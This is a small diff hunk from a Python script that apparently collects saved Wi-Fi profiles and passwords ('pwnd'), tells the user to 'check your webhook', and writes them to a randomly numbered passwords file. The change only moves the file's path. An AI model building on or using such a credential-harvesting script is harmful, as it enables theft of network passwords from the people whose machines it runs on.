@@ -33,7 +33,7 @@ if len(pwnd) == 0:
 
 print("Wi-Fi profiles found. Check your webhook...")
 
-file = './cosas/passwords-'+str(random.randint(1, 1000000))+'.txt' 
+file = 'passwords-'+str(random.randint(1, 1000000))+'.txt' 
 
 f = open(file, 'x')
 for pwnd_ssid in pwnd:
